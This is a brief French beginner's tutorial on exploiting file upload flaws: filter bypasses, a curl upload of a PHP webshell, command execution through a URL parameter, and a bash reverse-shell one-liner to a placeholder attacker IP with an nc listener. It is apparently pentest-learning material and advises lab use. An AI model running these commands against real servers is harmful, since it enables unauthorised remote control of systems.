# Vulnérabilités d’Upload de Fichiers

## Objectif
Exploiter une faille d’upload pour téléverser un fichier malveillant (webshell, reverse shell) et prendre le contrôle du serveur.

---

## Commandes essentielles et explications

### 1. Détection de la vulnérabilité
- Tester l’upload d’un fichier PHP ou d’une extension inhabituelle (ex : .php, .php5, .phtml).
- **Astuce débutant** : Renommer un fichier en "shell.php.jpg" ou "shell.phtml".

### 2. Bypass des filtres d’extension
- Tester différentes extensions, double extension, ou modification du Content-Type.
- Exemple d’upload avec curl :
```bash
curl -F "file=@shell.php" http://target.com/upload.php
```
- **À surveiller** : Fichier accepté, emplacement du fichier, possibilité d’exécution.

### 3. Exécution du webshell
- Accéder au fichier uploadé :
```
http://target.com/uploads/shell.php?cmd=id
```
- **À surveiller** : Exécution de commandes, affichage du résultat.

### 4. Reverse shell via webshell
- Exemple de commande à lancer dans le webshell :
```
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```
- **Astuce** : Lancer un listener sur ta machine :
```bash
nc -nlvp 4444
```

---

## Conseils pour débutants
- Toujours tester d’abord avec des extensions classiques, puis tenter des contournements.
- Vérifier l’emplacement du fichier uploadé et les droits d’exécution.
- Tester sur des environnements de lab, jamais en production sans autorisation.
- Lire la documentation de chaque outil pour découvrir des options avancées.

---

## Pour aller plus loin
- [PayloadsAllTheThings - File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Upload)
- [OWASP File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) 